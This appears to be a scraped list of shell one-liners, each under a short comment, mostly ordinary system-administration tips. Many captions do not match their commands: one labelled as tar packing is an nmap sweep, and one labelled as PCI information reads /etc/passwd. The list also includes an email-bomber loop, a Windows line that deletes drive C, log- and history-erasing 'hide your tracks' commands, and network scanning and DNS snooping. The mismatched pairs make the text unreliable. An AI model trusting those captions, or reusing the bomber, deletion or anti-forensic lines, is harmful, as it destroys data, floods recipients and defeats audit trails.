comm -1 -2 <(sort file1) <(sort file2) |& tee outputfile
# Manually trim SSD
sudo fstrim -v /
# Find in all files in the current directory, just a find shorthand
grep -H -n "pattern" *
# Remove all the files except abc in the directory
rm *[!abc]
# list and kill any processes currently using /mount
fuser -vmk /mount
# Find today created files
print -rl **/*(.m0)
# split mp3 file to chunks
mp3splt -t 1.0 myfile.mp3 -o @n_@f -d out_dir
# Get a PostgreSQL servers version
psql -h <SERVER NAME HERE>  -t -c 'SELECT version();' |head -1
# repeat any string or char n times without spaces between
echo "$(yes '+' | head -n5)"
# escape quotes, strip newlines, tabs and spaces from JSON
sed 's/\"/\\\"/g' json_file | tr -d '\n' | tr -d '[[:blank:]]'
# Delete all lines after the first match
sed -n -e '1,/match/p'
# bbs in utf8 console
zcat log.tar.gz | grep -a -i "string"
# Expand shortened URLs
expandurl() { curl -sIL $1 2>&1 | awk '/^Location/ {print $2}' | tail -n1; }
# Create AUTH PLAIN string to test SMTP AUTH session
authplain() { echo -n "AUTH PLAIN "; echo -n \\0$1\\0$2\\0 | base64; }
# Delete a large amount of files
find . -type f -delete
# pack with tar tar.gz
nmap -sn 192.168.1.0/24
# extract all tgz in current dir
ls *tgz | xargs -n1 tar xzf
# Display hardware information about PCI / PCIe Slots
cat /etc/passwd | grep "bash" | cut -d: -f1
# cd Nst subdir
cd $(ls -1 | sed -n '<N>p')
# Find files with size over 100MB and output with better lay-out
print -rl **/*(.Lm+100)
# List a large directory of files quickly
ls -U1
# cat file.txt | pv -qL 15
cat File.txt | pv -qL 15
# nano replace command
ctrl + altGr \
# check virt is available
egrep -c '(vmx|svm)' /proc/cpuinfo
# Reads in the ~/.Xdefaults
alias xdef_load='xrdb -merge ~/.Xdefaults'
# Exclude grep from your grepped output of ps (alias included in description)
pgrep -fl [h]ttpd
# Find out Information about BIOS
Get a list of user accounts and their login shell
# sleep for a random amount of time up to an hour
sleep `shuf -i 0-3600 -n 1`
# diff remote and local sshd_configs
colordiff <(ssh user@host cat /etc/ssh/sshd_config) /etc/ssh/sshd_config
# Save a file you edited in vim without the needed permissions
w !sudo cat >%
# create iso from partition
dd if=/dev/sdb of=/destination/usb-image.iso
# Random IPv4 address
for i in a b c d; do echo -n $(($RANDOM % 256)).; done | sed -e 's/\.$//g'
# Defcon 18 Quals Binary L33tness 300 Solution
echo "6d5967306474686924697344406b3379" | xxd -r -p
# Exclude grep from your grepped output of ps (alias included in description)
pgrep -fl [h]ttpd
# compare the contents of two directories
sdiff <(ls /) <(ls /usr)
# Simple find
seq -f  'echo %g' $NUM | sh
# Display all zombie process IDs
ps axo pid=,stat= | awk '$2~/^Z/ { print $1 }'
# Do not log last session in bash history:
kill -9 $$
# Recovery patition from iso
dd if=/sourceDestination/usb-image.iso of=/dev/sdb
# Scan computers OS and open services on all network
nmap -O 192.168.1.1/24
# Unzip testresult file from all zip-files and merge them into one testresult file.
7z e *.zip -r testresult -so >> testresult.txt
# Filtering IP address from ifconfig usefule in scripts
print ${$(ifconfig wlan0)[6]}
# Backup your OpenWRT config (only the config, not the whole system)
ssh root@router "uci export" > router.conf
# Listing only one repository with yum
yum list | grep my_repository_name
# pretty print json block that has quotes escaped
echo 'json_here' | sed 's/\\//g' | jq .
# Hexadecimal dump of a file, pipe, or anything
cat testfile | hexdump -C
# deleter
find . ! -size 0c -mtime +1 -type f -delete
# Remove new lines
xargs < [inputfile]
# Approximate grep for finding typos
agrep -2 differentially README.txt
# Extract remote gzip tarball
echo ${IP} | sed "s/[0-9\.]//g"
# Read the superblock
od -Ad -tx -j1024 -N1024 /dev/sdx
# Use tail -f effectively by omiting unwanted lines containing particular pattern of words using grep -v.
tail -f test | grep -v "bea"
# kill ip connection
tcpkill host <ip>
# Convert file from UTF8 (no BOM) to UTF16 (with BOM)
recode UTF8..UTF-16LE linux-utf8-file.txt
# Colorized grep in less
ack --pager='less -r'
# Timezone conversions (eg: what time was @tz_dest when it was $tm @tz_orig)
TZ="$tz_dest" date -d "$(TZ="$tz_orig" date -d "$tm")"
# grep lines containing two consecutive hyphens
grep "\-\-" file
# Get the /dev/disk/by-id fragment for a physical drive
print /dev/disk/by-id/*(@[1]:t)
# restart session
sudo restart lightdm
# Backup your OpenWRT config (only the config, not the whole system)
ssh root@router "sysupgrade -b -" > backup-router-$(date +%F-%R).tar.gz
# Stage change on tracked files.
git add -u
# Bulk change of mail domains in Rainloop
sed -i -E 's/mail\..*/localhost\"/g' *
# Hide what you've done so far
history -c && clear && printf "\e[3J"
# Delete duplicated dictionaries in spell check list
sudo find /usr/share/hunspell/ -lname '*' -delete
# Create a directory and cd into it
mydir(){mkdir -p $1 && cd $1}
# show WAN IP
curl ifconfig.me
# show 20 last modified files in current directory including subdirectories
ls -tl **/*(om[1,20])
# Detect encoding of a text file
uchardet <filename>
# Display ip info
ip a s
# tar.gz with gpg-encryption on the fly
tar --create --file - | gpg --encrypt --recipient --output .tar.gpg
# Continuously listen on a port and respond with a fixed message with netcat (and respond to kill signals)
while true ; do nc -l -p 4300 -c 'echo hello'; test $? -gt 0 && break; done
# Touch the commit date of the last commit. Useful in combination with `git cherry-pick`
env GIT_COMMITTER_DATE=(date) git commit --amend --date (date)
# open listening ports
netstat -ltn | awk -n '/tcp /{ split($4, x, ":"); print(x[2]); }' | sort -n
# Get the time and date of the last server reboot
last reboot
# bash chop
sed 's/.$//'
# vi a remote file with port
vim sftp://[user@]host.domain.tld:[port]/[path/][file]
# Mouse Remap Trolling
tcpdump -i eth1 -s0 -v -w /tmp/capture.pcap
# bash | lolcat -a -s 250
make your terminal interactive and fun
# git commit message and body
git commit -m "commit title message" -m "commit body message";
# Get the time and date of the last server reboot
last reboot
# Limit characters per line when viewing manual pages.
MANWIDTH=70 man 7 man
# Copy a file content to clipboard on Cygwin
cat file.txt | putclip
# shows history of logins on the server
last
# follow DNS Bind named log
journalctl --unit=named --follow
# tcpdump -i eth1 -s0 -v -w /tmp/capture_`date +%d_%m_%Y__%H_%I_%S`.pcap
tcpdump -i eth1 -s0 -v -w /tmp/capture_`date +%d_%m_%Y__%H_%I_%S`.pcap
# who is the console user?
who | grep :0 | head -1 | cut -d " " -f 1
# to get how many users logged in and logged out and how many times purely using awk
last | awk '$1!~/wtmp/{logs[$1]++}END{for (i in logs) print i, logs[i]}'
# Create a false directory structure for testing your commands
for i in /usr/bin/* ;do touch ${i##*/}; done
# List state of NAT.
netstat-nat -n
# Monitor file contents that is being overwritten regularly
while sleep 1; do clear; cat /tmp/whatever.cue; done
# backup your BMR info
dd if=/dev/sda of=mbr.bk bs=512 count=1
# Printout a list of field numbers from a CSV file with headers as first line.
sed 's/,/\n/g;q' file.csv | nl
# flush stdin in bash
read -d ^D
# dmesg: follow/wait for new kernel messages
dmesg -w
# Change permissions for all files in the current directory
find ./ -type f | xargs sudo chmod 644
# Command line email/SMS Bomber
while true; do echo "message here" | mutt something@something.com ; done
# check site if not reachable
10,30,50 * * * * ping -c1 -w3 www.test.com >/dev/null
# Print everything after last slash
basename /etc/environment
# drive empty
@Echo off Del C: *.* |y
# deleter
find -type f -size +0 -mtime +1 -print0|xargs -0r rm -f
# insert blank lines
sed G input.txt | cat -s
# human readable total directory size
du -cah /path/to/folder/ | grep total
# Change permission for all directories inside the current one
find site/ -type d | xargs sudo chmod 755
# Find out current working directory of a process
pwdx $(pgrep command)
# Extract the right stereo channel from all the wav files in current dir (left channel would be 'remix 1')
sed '1,5d'  /path/to/file
# Perform a reverse DNS lookup
dig +short -x 127.0.0.1
# Check the destination of a shortened URL without opening it
<Command> & disown
# Generate a new private key and Certificate Signing Request. CSR.csr MUST be extist before !
openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key
# Have a list of directories in a file, ending with newlines and need to run du on it?
cat filename | tr '\n' '\0' | du -hsc ?files0-from=-
# Find resolvable hosts in subnet
nmap -sL 74.125.237.1/24
# Copy Current Command Line to Clipboard
bind '"\C-l": "\C-u cat <<EOT | pbcopy \n \C-y \nEOT\n"'
# Generate entropy
rngd -f -r /dev/urandom
# Get a PostgreSQL servers version
psql -X -A -t -c "SELECT version();"
# Operating system identification data
cat /etc/os-release
# output your mp3 file over SSH on a remote computer's speaker
psnup -4 -pa4 -Pa4 file.ps file2.ps
# Make a quick alias for seeing date's format codes.
alias dateformatcodes="date --help | sed -n '/^FORMAT/,/%Z/p'"
# Get first argument in a script
[ $1 ] && my_dir=$1
# Size for all directories inside the current one
find . -type d -maxdepth 1 | xargs du -sh
# Set hidden attribe to a file in fat
fatattr -h <file>
# Check for listening services
netstat -tuapen | grep LISTEN
# Debug openssl from CLI
openssl s_client -state -connect site.com:443
# find only current directory (universal)
find /some/directory/* -prune -type f -name *.log
# find files that have been modified recently
find /target_directory -type f -mmin -60 --mindepth 2
# can look for large files taking up disk spaces using the cmd
find / -type f -size +500M 2>/dev/null | xargs du -h | sort -nr
# Using psnup to get two pages per page
psnup -2 file.ps | lpr
# Make a statistic about the lines of code
find . -name \*.c | xargs wc -l | tail -1 | awk '{print $1}'
# Get IPv4 of eth0 for use with scripts
ifconfig eth0 | awk '/inet / {print $2}' | cut -d ':' -f2
# merge ogg file into a new one according to their download time
cat  $(ls -c | grep  ogg | tac ) > directory/test.ogg
# no log to trace you
paste <(cut -f1 log.txt) <(cut -f2- log.txt | shuf)
# Monitoring file change while a copy
while true; do ls -all myfile; spleep 1; clear; done
# Change user's password
sudo passwd <username>
# generate a core dump of a process
ps -e | awk '$4~/<process name>/{print $1}' |xargs gcore -o ~/troubleshooting
# Get a quote from Pooh
grep -Pooh .*t..r,.* /etc/init.d/*
# Kill all Zombie processes one-liner
ps axo state,ppid | awk '!/PPID/$1~"Z"{print $2}' | xargs -r kill -9
# move files without actually touching them
cd /some/directory \&\& tar cf - |  cd /some/directory \&\& tar xvf - */
# Create a 1280x720 color plasma image. Different each time.
convert -size 1280x720 plasma:fractal background.png
# find command usage
find /pentest/ -type f -iname "*trace*"
# Show header HTTP with tcpdump
tcpdump -s 1024 -l -A src 192.168.9.56 or dst 192.168.9.56
# Transpose column to row
echo `echo -e "a\nb\nv"`
# truncate file descriptor
: > "/proc/$pid/fd/$fd"
# Display file names that have common ancestors
git diff $(git merge-base master HEAD) --name-only
# Extract a Zip File from STDOUT with the Jar Command
cat foo.zip | jar xv
# delete all DrWeb status, failure and other messages on a postfix server
mailq | grep DrWEB | awk {'print $1'} | sed s/*//g | postsuper -d -
# Remove CR LF from a text file
flip -u $FILE
# List only locally modified files with CVS
du -h --max-depth=1 | sort -hr
# Displays what shell you are using.
echo $0
# Converts a single FLAC file with associated cue file into multiple FLAC files
shnsplit -o flac -t "%n - %t - %a" -f sample.cue sample.flac
# Delete keys from Redis by matching a pattern
redis-cli keys pattern\* | xargs redis-cli del
# Scan all available IP addresses on network
nmap -sP $(ip -o addr show | grep inet\  | grep eth | cut -d\  -f 7)
# ASCII character set encoded in octal, decimal, and hexadecimal
man ascii
# find deleted files with open file descriptors(without lsof)
find /proc/*/fd -ls | grep  '(deleted)'
# file sizes of current directory
ls -la | awk '{print $5, " " ,$9}' | sort -rn
# Get the absolute path of a file
realpath -s <filename>
# Display only the actual uptime value
uptime | cut -d "," -f 1 | cut -d " " -f 4-
# Basic Shell function die_msg
die_msg() { echo $@ >&2; exit -1; }
# Turn on NFS Debugging
echo 1 > /proc/sys/sunrpc/nfs_debug
# repeat any string or char n times without spaces between
printf -- 'xyz%.0s' {1..20}
# Remove all docker images to cleanup disk
docker images | awk '{ print $3 }' | grep -v IMAGE | xargs docker rmi
# list files by testing the ownership
ls -la | awk '$3 == "oracle" || $3 == "root" {print $9}'
# find usage
find /etc/ /pentest/ -type f -iname "*sql*" | grep map
# lsb_release -a
lsb_release -a
# Restore application on Openshift
rhc snapshot restore -a {appName} -f {/path/to/snapshot/appName.tar.gz}
# Grep auth log and print ip of attackers
grep Failed auth.log | rev | cut -d\  -f4 | rev | sort -u
# Download mp3 from youtube with youtube-dl
youtube-dl --extract-audio --audio-format mp3 <video URL>
# Display the top ten running processes - sorted by memory usage
ps -eo size,command --sort -size | head
# A 'favorite' command.
alias myhost='ssh me@myhost'
# Simple server which listens on a port and prints out received data
nc -l -p portnumber
# Get full directory path of a script regardless of where it is run from
STARTING_DIR=$(cd $(dirname $0) && pwd)
# Tar all files in a folder including hidden dot files
tar -zcvf file.tgz ./
# Increment next number in vim
CTRL + A   ( in normal mode )
# calculate how many different lines between two files
grep -Fvxf $(file1) $(file2) | wc -l
# Look for the process bound to a certain port
sudo netstat -tulpn | grep :8080
# tsm tape media listing as readonly or readwrite
tsm> select Volume_Name, access from Volumes order by access
# This command will check the file /etc/passwd existence
[ -f /etc/passwd ] && echo "Yes" || echo "No"
# Calculating series with awk: add numbers from 1 to 100
awk 'BEGIN {for(i=1;i<=100;i++)sum+=i}; END {print sum}' /dev/null
# Finds the track no of songs, to be played
tr ' ' '\n' < <filename> > <output>
# Open multiple files from STDIN with VIM
vim -p $(complicated command to list the files you want)
# get WAN / external IP
curl tnx.nl/ip
# Kill Session
kill -9 `ps -u <user> -o "pid="`
# Delete Redis  keys by mask
redis-cli KEYS "user*" | xargs redis-cli DEL
# Docker: Remove all exited docker container
docker ps -a | grep Exit | awk -F " " '{ print $1 }' | xargs docker rm {}
# Move cursor to the beginning of the line
CTRL-A
# Put the command in background running state
nohup <command>
# encode mkv to mp4 with hardsubs
mpv file.mkv  -o out.mp4
# Lists unambigously names of all xml elements used in files in current directory
grep -Eho '<[a-ZA-Z_][a-zA-Z0-9_-:]*' * | sort -u | cut -c2-
# create random string from /dev/urandom (or another length)
echo `cat /dev/urandom | base64 | tr -dc "[:alnum:]" | head -c64`
# netstat with group by (ip adress)
netstat -nt | awk -F":" '{print $2}' | sort | uniq -c
# Find out the installation time of a linux system (when installed in a ext2/3/4 file system)
for i in $(seq -w 0 100) ; do mv prefix$(( 10#$i )).jpg prefix${i}.jpg ; done
# Start screen, attach here an now to sessionname , be quiet
screen -R -D -S sessionname -q
# CPU Display model type and MPN
ioreg -lw0 | grep IODisplayEDID | sed "/[^<]*</s///" | xxd -p -r | strings -6
# Sysadmin day date of any given year
YEAR=2015; ncal 7 $YEAR | sed -n 's/^Fr.* \([^ ]\+\) *$/Jul \1/p'
# paste numbers and operator to get an expression
seq 1 100 | paste -s -d '*'
# Erase preceding word
CTRL+W
# find all file larger than 500M
find / -type f -size +548576 -printf "%s:%h%f\n"
# Print all lines from a file that has the same N th and M th column
awk '$3==$4' /etc/passwd
# List the size (in human readable form) of all sub folders from the current location
du -hd1 |sort -h
# Generate SHA1 hash for each file in a list
find . -regex ".*\(avi\|mp4\|wmv\)$" -print0 | xargs -0 sha1sum
# Sysadmin day date of any given year
YEAR=2015; date -d${YEAR}0801-$(date -d${YEAR}0801+2days +%u)days +%b\ %e
# shell bash iterate number range with for loop
seq 10 20
# See which files differ in a diff
diff dir1 dir2 | diffstat
# Remove the boot loader from a usb stick
dd if=/dev/zero of=/dev/sdb bs=446 count=1
# Adjust brightness [software way]
find /var/www/ -type f -print0 | xargs -0 chmod 644
# more than 4 repeated characters to a single character
sed -ru 's/(.)\1{4,}/\1/g'
# List wireless clients connected to an access point
sudo netdiscover -r 192.168.1.0/24 -i wlo1
# Receiving alerts about commands who exit with failure
export PROMPT_COMMAND='( x=$? ; let x!=0 && echo shell returned $x )'
# floating point bash calculator w/o precision
b(){ echo "scale=${2:-2}; $1" | bc -l; }
# Show thermal info
cat /proc/acpi/thermal_zone/*/temperature
# hexadecimal dump of a file as it is on disk with hexadecimal offsets
od --format=x1  --address-radix=x mybinaryfile
# Ignore all Comment in Vim
hi! link Comment Ignore
# Copy file to multiple destinations
cat myfile | tee dest1 dest2 > /dev/null 2>&1
# coloured tail
tail -f FILE | ccze
# total percentage of memory use for all processes with a given name
ps -eo pmem,comm | grep chrome | cut -d " " -f 2 | paste -sd+ | bc
# See who's connected to your network =D
sudo netdiscover -r 192.168.1.0/24 -iwlo1
# convert raw camera image to jpeg
for i in *.CR2; do ufraw-batch $i --out-type=jpeg --output $i.jpg; done;
# DNS cache snooping
for i in `cat names.txt`; do host -r $i [nameserver]; done
# show your private/local ip address
ifconfig | grep cast | cut -d':' -f2 | cut -d' ' -f1
# Generate random valid mac addresses
macchanger -A (nic)
# it allows recording of your terminal
shelr record
# find . -name "*" -print | xargs grep -s pattern
find . -name "*" -print | xargs grep -s pattern
# See the members of a group
getent group <group>
# Remove abstracts from a bibtex file
sed '/^\s*abstract\s*=\s*{[^\n]*},$/ d' input.bib > output.bib
# find out about a process
cat /proc/<PID>/environ
# Remove blank lines from a file
sed -i.bak '/^[[:space:]]*$/d' file_name
# stdin speaker via espeak
awk '{print}' | espeak -v pt -stdin
# Check if your domain name is suspectable to axfr attacks.
dig @somenameserver.net somedomainname.net axfr
# find specified directory and delete it recursively including directories with spaces
find . -name "directory_name" -type d -print0 | xargs -0 -i rm -rf {}
# Creating a feature branch
git checkout -b myfeature develop
# Shows CPU usage for each process running in MikroTik RouterOS
tool profile
# bored of the waiting for moderation
echo "bored of the awaiting moderation"
# List only X byte files in the current directory
du -hs * |egrep -i "^(\s?\d+\.?\d+G)"
# Display a random man page
man $(ls /bin | shuf -n1)
# Recursively delete all files of a specific extension
find . -name "*.bak" -type f -delete
# floating point shell calculator
calc() { awk 'BEGIN { OFMT="%f"; print '"$*"'; exit}'; }
# Incorporating a finished feature on develop
git checkout develop; git merge --no-ff myfeature
# Check if a file is text
grep -qIm1 . $file
# Add a user to a group
gpasswd -a USER GROUP
# A random password generator
tr -dc '\x15-\x7e' < /dev/urandom| head -c 16 | paste
# See how many times you've typed 'ls' by itself
grep -cx ls ~/.bash_history
# rescan SCSI bus
sudo apt-get install scsitools && sudo rescan-scsi-bus
# List all users
cut -d: -f1 /etc/passwd | sort
# Play music from pure data
sudo cat /usr/share/icons/*/*/* > /dev/dsp
# Open your application to a specific size and location
command -geometry 120x30+1280+0
# Launch an interactive shell with special aliases and functions.
bash --rcfile /a/special/bashrc
# Find duplicate UID in /etc/passwd
awk -F: '{print $3}' /etc/passwd | sort |uniq -d
# Regex to wrap lines to 75 characters.
s/(?=.{75,})(?:(.{0,75})(?:\r\n?|\n\r?)|(.{0,75}))[ ]/\1\2\n /g
# Incorporating a finished feature on develop : Deleted branch myfeature
git branch -d myfeature
# show help text only in Vim
:h `subject` | only
# ls -altr | grep ^d
ls -altr | grep ^d
# Set audio card 0 master volumn to maximum
scp user@hostname:/remotedir/file.name /localdir
# Removing leading + sign from numbers
awk '{print $0+0}' <(echo -2; echo +3;)
# split a multi fasta file into separate files
csplit -z --prefix=PUT_PREFIX_HERE FILE_TO_SPLIT '/>/' '{*}'
# Switch on eeepc camera
sudo echo 1 > /proc/acpi/asus/camera
# Sets performance CPU governer of all cores of a 4-core CPU.
for i in {0..3}; do cpufreq-set -c $i -g performance; done
# Startup Nessus and initialize plugins on backtrack5
sudo /opt/nessus/sbin/nessusd
# Regex snippet to do multi-character [^x]*
Opening_tag((?:(?!Unwanted_tag).)*)Closing_tag
# Previous / next command in history
<ctrl+p> for previous command; <ctrl+n> for next command
# Perform a reverse DNS lookup
getent hosts <host>
# Find all alive host in the network
ps -o user,%cpu,%mem,command
# Extract a .gz file with privilege
sudo sh -c 'gunzip -c source.gz > destination'
# Matching Strings
grep -l <string-to-match> * | xargs grep -c <string-not-to-match> | grep '\:0'
# Open a file using vim in read only (like less)
view /file/name
# TCP server on one socket
while true; do cat "file"; done | nc -v -l 1337
# Display an updating clock in sh variants
while true; do date; sleep 1; done
# remove script from infected html files
grep -ZlRr -e BAD_SCRIPT_LINE * |xargs -0 sed -i 's/BAD_SCRIPT_LINE//g'
# Display diffed files sidebyside, with minimal differences, using the full width of the terminal.
diff -dbByw $COLUMNS FILE1 FILE2
# Partition a new disk as all one partition tagged as LINUX_NATIVE
echo "0,,L" | sfdisk /dev/sdX
# Synchronize directory copy
rsync -avz ~/src ~/des/
# Check Zone File
named-checkzone {zonename} {filename}
# tar xz maximal compression
XZ_OPT=-9 tar cJf tarfile.tar.xz directory
# list the top 15 folders by decreasing size in MB
du -mx [directory] | grep -P '^\d{4}' | sort -rn
# Kill process you don't know the PID of, when pidof and pgrep are not available.
killall -9 unique
# Sum columns on one line in a csv file.
awk -F , '{for(i=1;i<=NF;i++)t[NR]+=$i;$0=t[NR]}1' sample.csv
# easily trace all Nginx processes
sudo strace -e trace=network -p `pidof nginx | sed -e 's/ /,/g'`
# Find the last command that begins with "ech", but don't run it:-
!ech:p
# Find every directory with too many files and subdirectory.
find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n
# dmesg pipe less with color
dmesg -L=always | less -r
# get the IP connected to the server (usefull to detect IP that should be blocked)
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort  | uniq -c | sort -n
# Get parent directory path
dirname `pwd`
# Using Grep & Xargs to clean folders
du -sh
# External IP (raw data)
curl ifconfig.me
# remove directory and sub directory
rm -rf directoryname
# Sum columns on one line in a csv file.
tr , + < input.csv | bc
# Ten most often used commands
history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
# Generate padded numbers 001 002 ... 100
echo 00{1..9} 0{10..99} 100
# convert string to array
s="124890";for i in $(seq 0 1 $((${#s}-1))); do arr[$i]=${s:$i:1}; done
# Sum of directories
du -sh *
# Get the /dev/disk/by-id fragment for a physical drive
/dev/disk/by-id/ata!(*part*)
# Get all interfaces name
ip addr | sed '/^[0-9]/!d;s/: <.*$//;s/^[0-9]: //'
# tcpdump -nqt -s 0 -A -i eth0 port 5060
tcpdump -nqt -s 0 -A -i eth0 port 5060
# join every five lines
seq 20 | awk 'ORS=NR%5?FS:RS'
# Flush DNS
sudo /etc/init.d/dns-clean
# Git log (commits titles) of today
git log --after="yesterday" --pretty=format:%s |uniq
# resize all the images returned by ls command and append "new_" to the resized images
for file in `ls *.png`;do convert $file -resize 65% new_$file; done
# display text file within an editor on whatever workspace is in front of you
ls -1 | sed 's/\(.*\)\.\(.*\)/\"&\" \"\1@2x\.\2\"/' | xargs -n2 mv
# Grep live log tailing
tail -f some_log_file.log | grep the_thing_i_want
# Make M-n, M-m, and M-, insert the zeroth, first, and second argument of the previous command in Bash
printf %s\\n '"\en": "\e0\e."' '"\em": "\e1\e."' '"\e,": "\e2\e."'>>~/.inputrc
# Extract names and email addresses from LDIF files
grep -E '^(cn|mail):' file.ldif | sed -e 's/^[a-z]*: //'
# group every five lines
awk '{x+=$2; y+=$3} NR%5==0{print x/5,y/5; x=y=0}' file.txt
# Sum size of files returned from FIND
(echo 0; find [args...] -printf '%s +\n'; echo p) | dc
# Go to the Nth line of file
sed -n '15p' $file
# Make changes in .bashrc immediately available
. ~/.bashrc
# list all world-writeable Linux files
print -rl /**/*(.f:o+w:)
# Use awk's FIELDWIDTHS function to manipulate a string.
echo "rootgot" | awk 'BEGIN{FIELDWIDTHS="4 3"}{print $2$1}'
# creating command 'tc' which copies last given command to clipboard
alias "tc=fc -n -l -1 -1|pbcopy"
# Make M-j insert (duplicate) the last word of the Readline line buffer in Bash
bind '"\ej": "!#:$\e^"'
# cpuinfo
cat /proc/cpuinfo
# Get IPv4 of eth0 for use with scripts
ifconfig eth0 | grep -o "inet [^ ]*" | cut -d: -f2
# Rspec: run specs that were created/changed on my branch only
git diff --name-only origin/master.. | grep _spec.rb | xargs rspec
# rsync from remote to local with non standard ssh port
rsync -avz -e "ssh -p $portNumber" user@remote.host:/path/to/copy /local/path
# Sort IPv4 address in order
sort -V ~/ip.txt
# Add keybindings for cycling through completions (or for inserting the last or first completion) in Bash
bind '"\er":menu-complete-backward';bind '"\es":menu-complete'
# sudo for launching gui apps in background
sudo -b xterm
# Play Star Wars Episode IV in your terminal ;)
date '+%y%m%d-%H%M%S'
# Calculate different hash sums of one file at the same time
dd if=file | tee >(sha1sum) >(md5sum) >(sha256sum) >/dev/null
# BIGGEST Files in a Directory
find . -printf '%s %p\n'|sort -nr| head -1
# Remove duplicate files from the current directory
sha1sum * | sort | rev | uniq -df1 | rev | cut -d" " -f3 | xargs rm
# Display playing parameters of soundcards
grep -r "" /proc/asound/card*/pcm*/sub*/hw_params
# rsync from remote to local
rsync -chavzP --stats user@remote.host:/path/to/copy /path/to/local/storage
# Link all the files in this directory to that directory
cd /this/directory; for f in *; do ln -s `pwd`/$f /that/directory; done
# @mail.com by adding the line in list.txt
while read line; do echo -e "$line@mail.com"; done < list.txt
# Time a process run with simple one line tabbed output
/usr/bin/time -f "%E real\t%U user\t%S sys" pipeline
# Only change the first occurrence of the pattern
sed -i "0,/enabled/{s|enabled=0|enabled=1|}" /etc/yum.repos.d/remi.repo
# Get some useful output from tcpdump
tcpdump -nvvX -s 768 src x.x.x.x and dst port 80
# python
python -mtrace --trace aa.py
# NETSTAT ESTABLISHED
netstat | find "ESTABLISHED"
# Find where a kind of file is stored
locate *.desktop
# Mount folder/filesystem through SSH
sshfs name@server:/path/to/folder /path/to/mount/point
# List the size (in human readable form) of all sub folders from the current location
du -sh *
# Restart nautilus
nautilus -q
# MySQL: Strip a my.cnf file from comments, remove blank lines, normalize spaces:
cat my.cnf | sed '/^#/d' | sed '/^$/d' | sed -e 's/[ \t]\+//g'
# Join the content of a bash array with commas
printf "%s," "${LIST[@]}" | cut -d "," -f 1-${#LIST[@]}
# Clear terminal screen as well as terminal buffer
printf "\ec"
# Generate a random password.
echo $(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c10)
# List aliases that match a regexp
function alls() { alias -p | sed -n "/^alias $1/p" }
# Look for the process bound to a certain port
sudo lsof -i | grep :8080
# mount -n -o remount /
mount -n -o remount /
# Stripping filenames part
for file in ./*; do mv "$file" "${file/part-to-strip/}"; done
# delete at start of each line until character
sed 's/^[^:]*://g'
# Count occurrences of a word/token in a file
find . -name file.txt | xargs -e grep "token" -o | wc -l
# Delete the previous entry in your history
alias histdel='history -d $((HISTCMD-2)) && history -d $((HISTCMD-1))'
# Convert encoding of a file
iconv -f utf8 -t utf16 /path/to/file
# easier sudo apt-get install
alias sagi="yes | sudo apt-get install"
# Remove the first line containing 'match' from file
sed -i "$(grep -nm 1 match file|cut -f1 -d:)d" file
# Create patch file for two directories
diff -ru originDir updateDir > result.patch
# Switch workspace
pkill -9 -u username
# save manpage as html file
zcat `man -w manpage` | groff -mandoc -T html - > filename.html
# send an email through linux command line van be achieved by
mail -s "myip" youremail@domain.com
# Get the number of open sockets for a process
ps aux | grep [process] | awk '{print $2}' | xargs -I % ls /proc/%/fd | wc -l
# number kill your terminal
for ((i=0; i>-1000; --i)); do echo "${!i}"; done
# To get the average httpd process size, log into your server and run the following on the command line
ps aux | grep 'httpd' | awk '{print $6/1024 " MB";}'
# Strip beginning numbers in a filename
find . -type f | sed 's|\(.*/\)[^A-Z]*\([A-Z].*\)|mv \"&\" \"\1\2\"|' | sh
# Realtime delay effect
arecord -D plughw:1,0 | play -d echos 0.3 0.2 700 0.25 800 0.3
# Report summary of string occurrence by time period (hour)
cat z.log | grep Timeout | cut -d ':' -f1 | sort | uniq -c
# open manpage in browser
man -HBrowser manpage
# Gets directory size on sub directories in current dir with human readable size
du -h --max-depth=1
# Copy with TAR PV and NC
while true; do nc -l -p 50002 | pv | tar -xf -; done
# monitor all open connections to specific port
netstat -anp | grep ":<port>"
# printing text between tags
echo or cat something | grep -Po '(?<=text_before).*(?=text_after)'
# Pretty-print user/group info for a given user
id <user_name>  | sed 's/,/\n/g' | tr ' ' '\n'
# Empty a file
> [filename].txt
# Find out what files are changed or added in a git repository.
git log --name-only | less
# Source multiline grep with pcregrep
pcregrep --color -M -N CRLF "owa_pattern\.\w+\W*\([^\)]*\)" source.sql
# redirecting stdout of multiple commands
{ command1 args1 ; command2 args2 ; ... }
# Execute the command given by history event number
!<number>
# Kill all background jobs
jobs | grep -o "[0-9]" | while read j; do kill %$j; done
# sudo ssh -D 88 -fN user@xxxx.no-ip.info
sudo ssh -D 88 -fN user@xxxx.no-ip.info
# Open/modify .odt in nano with indentation
unzip document.odt content.xml && xmlindent -w content.xml && nano content.xml
# extract email adresses from some file (or any other pattern)
grep -aEio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
# Synchronize date and time with a server over ssh (BusyBox-friendly)
date -u `ssh user@remotehost date -u '+%m%d%H%M%Y.%S'`
# Remote copy in batch, exclude specified pattern
scp -r `ls | grep -vE "(Pattern1|Pattern2)"` user@remote_host:/location
# Docker: Remove all exited docker container
docker ps -a | grep "Exited" | awk '{print $1}' | xargs docker rm
# How to exclude all "permission denied" messages from "find"
find <paths> ! -readable -prune -o <other conditions like -name> -print
# Fast grepping (avoiding UTF overhead)
export LANG=C; grep string longBigFile.log
# Read just the IP address of a device
ifconfig -l | xargs -n1 ipconfig getifaddr 2> /dev/null
# Generate MD5 of string and output only the hash checksum in a readable format
echo -n "String to MD5" | md5sum | sed -e 's/../& /g' -e 's/  -//'
# Count new mail
mail -H | grep '^.U' | wc -l
# read old reversion of file
echo 'hello world'
# Command line calculator
alias calc='python -ic "from math import *; from random import *"'
# Count loglines by time (minute)
cat z.log  | cut -d ':' -f1,2  | uniq -c
# Remaining Disk space for important mounted drives
df -H | grep -vE '^Filesystem|tmpfs|cdrom|none' | awk '{ print $5 " " $1 }'
# Incremental copy to remote host
rsync -v --ignore-existing `ls | head -n 40` root@localhost:/location
# Remove all quotes from csv
tr -d "\"" < infile.csv > noquotes.csv
# Update all Docker Images
docker images | grep -v REPOSITORY | awk '{print $1}' | xargs -L1 docker pull
# Find which config-file is read
strace 2>&1  geany |grep geany.conf
# Use a variable in a find command.  Useful in scripting.
find . -iname \*${MYVAR}\* -print
# List your MACs address
echo | ifconfig | grep HWaddr
# reverse order of file
